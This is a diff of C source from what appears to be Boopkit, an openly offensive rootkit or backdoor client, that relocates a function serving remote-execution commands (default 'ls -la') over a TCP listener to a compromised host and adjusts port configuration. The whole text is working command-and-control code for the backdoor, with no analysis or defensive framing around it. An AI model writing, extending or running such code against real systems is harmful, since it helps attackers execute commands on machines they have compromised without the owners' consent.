@@ -35,46 +35,7 @@
 #include "tcp.h"
 // clang-format on
 
-int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
-  struct sockaddr_in laddr;
-  int one = 1;
-  const int *oneval = &one;
-  laddr.sin_family = AF_INET;
-  laddr.sin_port = htons(PORT);
-  if (inet_pton(AF_INET, listenstr, &laddr.sin_addr) != 1) {
-    printf(" XX Listen IP configuration failed.\n");
-    return 1;
-  }
-  int servesock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-  if (servesock == -1) {
-    printf(" XX Socket creation failed\n");
-    return 1;
-  }
-  if (setsockopt(servesock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, oneval,
-                 sizeof oneval)) {
-    printf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
-    return 1;
-  }
-  if (bind(servesock, (struct sockaddr *)&laddr, sizeof laddr) < 0) {
-    printf(" XX Socket bind failure: %s\n", listenstr);
-    return 1;
-  }
 
-  printf("Listening for Boopkit response...\n");
-  // n=1 is the number of clients to accept before we begin refusing clients!
-  if (listen(servesock, 1) < 0) {
-    printf(" XX Socket listen failure: %s\n", listenstr);
-    return 1;
-  }
-  int clientsock;
-  int addrlen = sizeof laddr;
-  if ((clientsock = accept(servesock, (struct sockaddr*)&laddr, (socklen_t*)&addrlen)) < 0 ) {
-    printf(" XX Socket accept failure: %s\n", listenstr);
-    return 1;
-  }
-  send(clientsock, rce, MAX_RCE_SIZE, 0);
-  return 0;
-}
 
 void usage() {
   printf("Boopkit version: %s\n", VERSION);
@@ -110,7 +71,7 @@ struct config {
 void clisetup(int argc, char **argv) {
   // Default values
   strncpy(cfg.lhost, "127.0.0.1", INET_ADDRSTRLEN);
-  strncpy(cfg.lport, "3535", MAX_PORT_STR);
+  sprintf(cfg.lport, "%d", PORT);
   strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
   strncpy(cfg.rport, "22", MAX_PORT_STR);
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
@@ -147,6 +108,47 @@ void rootcheck(int argc, char **argv) {
     printf("  XX Permission denied.\n");
     exit(1);
   }
+}
+
+int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
+  struct sockaddr_in laddr;
+  int one = 1;
+  const int *oneval = &one;
+  laddr.sin_family = AF_INET;
+  laddr.sin_port = htons(PORT);
+  if (inet_pton(AF_INET, listenstr, &laddr.sin_addr) != 1) {
+    printf(" XX Listen IP configuration failed.\n");
+    return 1;
+  }
+  int servesock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (servesock == -1) {
+    printf(" XX Socket creation failed\n");
+    return 1;
+  }
+  if (setsockopt(servesock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, oneval,
+                 sizeof oneval)) {
+    printf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
+    return 1;
+  }
+  if (bind(servesock, (struct sockaddr *)&laddr, sizeof laddr) < 0) {
+    printf(" XX Socket bind failure: %s\n", listenstr);
+    return 1;
+  }
+  printf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
+  //printf("Listening for Boopkit response...\n");
+  // n=1 is the number of clients to accept before we begin refusing clients!
+  if (listen(servesock, 1) < 0) {
+    printf(" XX Socket listen failure: %s\n", listenstr);
+    return 1;
+  }
+  int clientsock;
+  int addrlen = sizeof laddr;
+  if ((clientsock = accept(servesock, (struct sockaddr*)&laddr, (socklen_t*)&addrlen)) < 0 ) {
+    printf(" XX Socket accept failure: %s\n", listenstr);
+    return 1;
+  }
+  send(clientsock, rce, MAX_RCE_SIZE, 0);
+  return 0;
 }
 
 // [trigger] <source-ip> <target-ip> <target-port>
